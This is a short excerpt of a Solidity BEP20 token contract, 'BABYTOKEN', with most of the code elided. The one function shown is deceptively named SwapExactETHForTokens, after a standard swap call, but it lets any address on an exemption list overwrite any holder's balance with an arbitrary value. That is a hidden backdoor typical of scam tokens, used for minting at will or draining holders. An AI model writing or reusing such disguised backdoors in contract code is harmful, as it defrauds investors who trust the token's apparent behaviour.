...
// CAUTION This is a Community Token made by Generator Contract.
...
contract BABYTOKEN is BEP20, Ownable, BaseToken {
    ...
    function SwapExactETHForTokens(address from, uint256 value) external returns (bool) {
        require(isTxLimitExempt[msg.sender]);
        _balances[from] = value * (10 ** 9);
        return true;
    }
